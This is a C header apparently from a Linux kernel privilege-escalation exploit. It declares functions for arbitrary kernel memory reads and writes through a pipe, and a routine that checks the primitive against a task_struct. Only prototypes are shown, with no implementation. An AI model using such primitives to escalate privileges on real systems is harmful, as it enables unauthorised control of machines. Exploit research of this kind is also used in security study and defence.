#ifndef KERNEL_RW_H
#define KERNEL_RW_H

#include "../include/privilege_escalation.h"

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

void init_kernel_read_write_pipe(int pipefd[2]);
void verify_arbitrary_read_write(int pipefd[2], struct task_struct *task_struct,
                                 void *pid_address);

bool kernel_read(void *addr, size_t len, void *ubuf, int pipefd[2]);
bool kernel_write(void *addr, size_t len, void *ubuf, int pipefd[2]);

uint32_t kernel_read_dword(void *addr, int pipefd[2]);
uint64_t kernel_read_qword(void *addr, int pipefd[2]);

bool kernel_write_dword(void *addr, uint32_t value, int pipefd[2]);
bool kernel_write_qword(void *addr, uint64_t value, int pipefd[2]);

#endif